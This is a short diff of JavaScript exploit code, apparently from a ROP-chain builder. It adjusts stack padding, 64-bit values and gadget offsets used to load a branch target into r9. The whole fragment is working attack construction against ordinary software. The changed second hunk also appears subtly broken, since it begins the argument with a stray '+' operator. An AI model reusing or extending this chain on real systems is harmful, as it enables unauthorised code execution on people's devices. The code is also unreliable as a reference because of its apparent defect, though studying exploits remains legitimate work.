@@ -363,15 +363,15 @@ class ChainBuilder {
 			// Load r9 from stack, which is the opd to branch to
 			+ Util.pad(0x10, SF)
 			+ Util.int64(0x0, this.offsets.gadgetZMod1)
-			+ Util.pad(0x68, AA)
-			+ Util.int32(0xffffffff)
+			+ Util.pad(0x60, AA)
+			+ Util.int64(0xffffffff, 0xffffffff)
+			+ Util.int32(0x0)
 		);
 		
 		this.appendChainDataOffset(this.dataOffsets['opdGadgetZ1']);
 		
 		this.appendChain(
-			Util.int64(0x0, 0xffffffff)
-			+ Util.pad(0x40, AA)
+			+ Util.pad(0x50, AA)
 			
 			//////////
 			
